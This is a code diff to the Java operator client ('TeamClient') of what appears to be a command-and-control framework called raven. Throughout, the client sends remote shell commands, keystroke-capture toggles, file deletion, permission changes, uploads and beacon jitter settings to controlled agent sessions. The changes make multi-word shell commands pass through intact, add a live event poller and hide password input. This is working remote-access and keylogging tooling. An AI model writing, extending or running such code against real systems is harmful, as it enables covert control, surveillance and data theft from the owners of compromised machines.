@@ -40,6 +40,7 @@ public final class TeamClient {
     private String OperatorName;
     private OperatorRole OperatorRoleValue;
     private volatile boolean Running = true;
+    private volatile String LastEventTimestamp = "";
     private BufferedReader ConsoleReader;
 
     public TeamClient(ServerConfig Config, String TsHost, int TsPort) {
@@ -52,6 +53,7 @@ public final class TeamClient {
 
     public void Run() {
         if (!Login()) return;
+        StartEventPoller();
         ConsoleReader = new BufferedReader(new InputStreamReader(System.in));
         while (Running) {
             try {
@@ -65,7 +67,7 @@ public final class TeamClient {
                 if (Input == null) break;
                 Input = Input.trim();
                 if (Input.isEmpty()) continue;
-                String[] Parts = Input.split("\\s+", 3);
+                String[] Parts = Input.split("\\s+");
                 String Cmd = Parts[0].toLowerCase();
                 Dispatch(Cmd, Parts, Input);
             } catch (IOException Ex) {
@@ -185,7 +187,7 @@ public final class TeamClient {
                     break;
                 }
                 try {
-                    Exec(ParseInt(P[1]), P.length > 2 ? "ls " + P[2] : "ls");
+                    Exec(ParseInt(P[1]), P.length > 2 ? "ls " + Args(P, 2) : "ls");
                 } catch (NumberFormatException Ex) {
                     Logger.Warn("invalid session ID");
                 }
@@ -196,7 +198,7 @@ public final class TeamClient {
                     break;
                 }
                 try {
-                    Exec(ParseInt(P[1]), "cat " + P[2]);
+                    Exec(ParseInt(P[1]), "cat " + Args(P, 2));
                 } catch (NumberFormatException Ex) {
                     Logger.Warn("invalid session ID");
                 }
@@ -218,7 +220,7 @@ public final class TeamClient {
                     break;
                 }
                 try {
-                    String[] Up = P[2].split("\\s+", 2);
+                    String[] Up = Args(P, 2).split("\\s+", 2);
                     DoUpload(ParseInt(P[1]), Up[0], Up.length > 1 ? Up[1] : "");
                 } catch (NumberFormatException Ex) {
                     Logger.Warn("invalid session ID");
@@ -230,7 +232,7 @@ public final class TeamClient {
                     break;
                 }
                 try {
-                    SetNote(ParseInt(P[1]), P[2]);
+                    SetNote(ParseInt(P[1]), Args(P, 2));
                 } catch (NumberFormatException Ex) {
                     Logger.Warn("invalid session ID");
                 }
@@ -280,7 +282,7 @@ public final class TeamClient {
                     break;
                 }
                 try {
-                    Exec(ParseInt(P[1]), "shell " + P[2]);
+                    Exec(ParseInt(P[1]), "shell " + Args(P, 2));
                 } catch (NumberFormatException Ex) {
                     Logger.Warn("invalid session ID");
                 }
@@ -327,63 +329,63 @@ public final class TeamClient {
             case "lastlog" -> { if (P.length < 2) Logger.Warn("usage: lastlog <id>"); else SimpleExec(P, "lastlog"); }
             case "jitter" -> {
                 if (P.length < 3) { Logger.Warn("usage: jitter <id> <ms>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "jitter " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "jitter " + Args(P, 2));
             }
             case "keystroke" -> {
                 if (P.length < 3) { Logger.Warn("usage: keystroke <id> <on|off>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "keystroke " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "keystroke " + Args(P, 2));
             }
             case "searchfiles" -> {
                 if (P.length < 3) { Logger.Warn("usage: searchfiles <id> <pattern>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "searchfiles " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "searchfiles " + Args(P, 2));
             }
             case "osquery" -> {
                 if (P.length < 3) { Logger.Warn("usage: osquery <id> <sql>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "osquery " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "osquery " + Args(P, 2));
             }
             case "head" -> {
                 if (P.length < 3) { Logger.Warn("usage: head <id> <file> [n]"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "head " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "head " + Args(P, 2));
             }
             case "tail" -> {
                 if (P.length < 3) { Logger.Warn("usage: tail <id> <file> [n]"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "tail " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "tail " + Args(P, 2));
             }
             case "rm" -> {
                 if (P.length < 3) { Logger.Warn("usage: rm <id> <path>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "rm " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "rm " + Args(P, 2));
             }
             case "mkdir" -> {
                 if (P.length < 3) { Logger.Warn("usage: mkdir <id> <path>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "mkdir " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "mkdir " + Args(P, 2));
             }
             case "cp" -> {
                 if (P.length < 3) { Logger.Warn("usage: cp <id> <src> <dst>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "cp " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "cp " + Args(P, 2));
             }
             case "mv" -> {
                 if (P.length < 3) { Logger.Warn("usage: mv <id> <src> <dst>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "mv " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "mv " + Args(P, 2));
             }
             case "chmod" -> {
                 if (P.length < 3) { Logger.Warn("usage: chmod <id> <mode> <file>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "chmod " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "chmod " + Args(P, 2));
             }
             case "find" -> {
                 if (P.length < 3) { Logger.Warn("usage: find <id> <path> [name]"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "find " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "find " + Args(P, 2));
             }
             case "grep" -> {
                 if (P.length < 3) { Logger.Warn("usage: grep <id> <pattern> <file>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "grep " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "grep " + Args(P, 2));
             }
             case "hash" -> {
                 if (P.length < 3) { Logger.Warn("usage: hash <id> <file> [sha256|md5]"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "hash " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "hash " + Args(P, 2));
             }
             case "cd" -> {
                 if (P.length < 3) { Logger.Warn("usage: cd <id> <path>"); break; }
-                SimpleExec(new String[]{P[0], P[1]}, "cd " + P[2]);
+                SimpleExec(new String[]{P[0], P[1]}, "cd " + Args(P, 2));
             }
             case "stats" -> {
                 try {
@@ -494,7 +496,7 @@ public final class TeamClient {
             }
             case "webstart" -> {
                 String WHost = P.length > 1 ? P[1] : "0.0.0.0";
-                int WPort = P.length > 2 ? ParseIntSafe(P[2], 5000) : 5000;
+                int WPort = P.length > 2 ? ParseIntSafe(P[2], 8080) : 8080;
                 try {
                     Map<String, Object> R = Post("/api/server/webpanel/start",
                         Map.of("Host", WHost, "Port", WPort, "Operator", OperatorName));
@@ -562,8 +564,8 @@ public final class TeamClient {
         } catch (java.net.ConnectException Ex) {
             Logger.Error("connection refused — " + TsHost + ":" + TsPort);
             System.out.println();
-            Logger.Custom(INDENT + "TeamClient requires a running TeamServer Web (-TSW).%n");
-            Logger.Custom(INDENT + "Start with: java -jar raven.jar -TSW -p 4444 -tp %d%n%n", TsPort);
+            Logger.Custom(INDENT + "TeamClient requires a running TeamServer backend.%n");
+            Logger.Custom(INDENT + "Start with: java -jar raven.jar -TS -tp %d%n%n", TsPort);
             return false;
         } catch (Exception Ex) {
             Logger.Error("TeamServer unreachable: " + Ex.getMessage());
@@ -578,7 +580,11 @@ public final class TeamClient {
                 if (User == null || User.isBlank()) return false;
                 Logger.Custom(INDENT + "%sPassword:%s ", AnsiColor.White, AnsiColor.Reset);
                 System.out.flush();
-                String Pass = Reader.readLine();
+                char[] PassChars = System.console() != null
+                    ? System.console().readPassword()
+                    : Reader.readLine().toCharArray();
+                String Pass = new String(PassChars);
+                java.util.Arrays.fill(PassChars, '\0');
                 if (Pass == null) return false;
                 Map<String, Object> Body = new LinkedHashMap<>();
                 Body.put("Username", User.trim());
@@ -591,6 +597,7 @@ public final class TeamClient {
                 Token = Resp.getOrDefault("Token", "").toString();
                 OperatorName = Resp.getOrDefault("Username", User.trim()).toString();
                 OperatorRoleValue = OperatorRole.FromString(Resp.getOrDefault("Role", "MEMBER").toString());
+                LastEventTimestamp = java.time.LocalDateTime.now().format(java.time.format.DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
                 System.out.println();
                 Logger.Ok("Welcome, " + OperatorName + " [" + OperatorRoleValue + "]");
                 Logger.Custom(INDENT + "%sConnected to TeamServer at %s:%d%s%n%n", AnsiColor.White, TsHost, TsPort, AnsiColor.Reset);
@@ -671,6 +678,9 @@ public final class TeamClient {
             Logger.Custom(INDENT + "%sAddress   %s%s:%d%n", AnsiColor.Red, AnsiColor.White, R.getOrDefault("Host", "?"), ((Number) R.getOrDefault("Port", 0.0)).intValue());
             Logger.Custom(INDENT + "%sUptime    %s%s%n", AnsiColor.Red, AnsiColor.White, R.getOrDefault("Uptime", "?"));
             Logger.Custom(INDENT + "%sSessions  %s%d%n", AnsiColor.Red, AnsiColor.White, ((Number) R.getOrDefault("Agents", 0.0)).intValue());
+            long SleepMs  = ((Number) R.getOrDefault("SleepIntervalMs", 5000.0)).longValue();
+            long JitterMs = ((Number) R.getOrDefault("JitterMs", 1000.0)).longValue();
+            Logger.Custom(INDENT + "%sSleep     %s%ds ± %dms%n", AnsiColor.Red, AnsiColor.White, SleepMs / 1000, JitterMs);
             String DbType   = R.getOrDefault("DbType", "none").toString();
             boolean DbUp    = Boolean.parseBoolean(R.getOrDefault("DbOnline", "false").toString());
             Logger.Custom(INDENT + "%sDB        %s%s (%s)%n", AnsiColor.Red, AnsiColor.White, DbUp ? "connected" : "offline", DbType);
@@ -804,6 +814,68 @@ public final class TeamClient {
         } catch (Exception Ex) {
             Logger.Error(Ex.getMessage());
         }
+    }
+
+    private void StartEventPoller() {
+        Thread Poller = new Thread(() -> {
+            int ConsecutiveFailures = 0;
+            boolean DropReported    = false;
+            while (Running) {
+                try {
+                    Thread.sleep(2000);
+                    if (!Running) break;
+                    Map<String, Object> Response = Get("/api/logs");
+                    if (ConsecutiveFailures > 0) {
+                        ConsecutiveFailures = 0;
+                        DropReported        = false;
+                        PromptManager.PrintLine(INDENT + AnsiColor.Green + "⟳ reconnected to TeamServer" + AnsiColor.Reset);
+                    }
+                    Object RawLogs = Response.get("Logs");
+                    if (!(RawLogs instanceof java.util.List)) continue;
+                    java.util.List<?> Entries = (java.util.List<?>) RawLogs;
+                    for (Object Raw : Entries) {
+                        String Line = String.valueOf(Raw);
+                        if (Line.isEmpty() || Line.isBlank()) continue;
+                        String Timestamp = "";
+                        String Message   = Line;
+                        if (Line.startsWith("[") && Line.contains("] ")) {
+                            int Close = Line.indexOf("] ");
+                            Timestamp = Line.substring(1, Close);
+                            Message   = Line.substring(Close + 2);
+                        }
+                        if (Timestamp.isEmpty() || Timestamp.compareTo(LastEventTimestamp) <= 0) continue;
+                        LastEventTimestamp = Timestamp;
+                        boolean IsSession = Message.contains("[+]") || Message.contains("[-]") || Message.contains("session-");
+                        boolean IsAuth    = Message.contains("[AUTH]");
+                        boolean IsTeam    = Message.contains("[TEAM]") || Message.contains("[>]");
+                        boolean IsError   = Message.contains("[!]") || Message.contains("ERROR");
+                        String Color = IsSession ? AnsiColor.Green : IsAuth ? AnsiColor.Yellow : IsTeam ? AnsiColor.Cyan : IsError ? AnsiColor.Red : AnsiColor.White;
+                        PromptManager.PrintLine(INDENT + Color + "[" + Timestamp + "] " + Message + AnsiColor.Reset);
+                    }
+                } catch (InterruptedException InterruptedException) {
+                    Thread.currentThread().interrupt();
+                    break;
+                } catch (Exception PollException) {
+                    ConsecutiveFailures++;
+                    if (ConsecutiveFailures >= 3 && !DropReported) {
+                        DropReported = true;
+                        PromptManager.PrintLine(INDENT + AnsiColor.Red + "⚠ TeamServer connection lost — retrying..." + AnsiColor.Reset);
+                    }
+                }
+            }
+        }, "EventPoller");
+        Poller.setDaemon(true);
+        Poller.start();
+    }
+
+    private static String Args(String[] Parts, int FromIndex) {
+        if (FromIndex >= Parts.length) return "";
+        StringBuilder Builder = new StringBuilder();
+        for (int Index = FromIndex; Index < Parts.length; Index++) {
+            if (Index > FromIndex) Builder.append(' ');
+            Builder.append(Parts[Index]);
+        }
+        return Builder.toString();
     }
 
     private void Exec(int Id, String Cmd) {
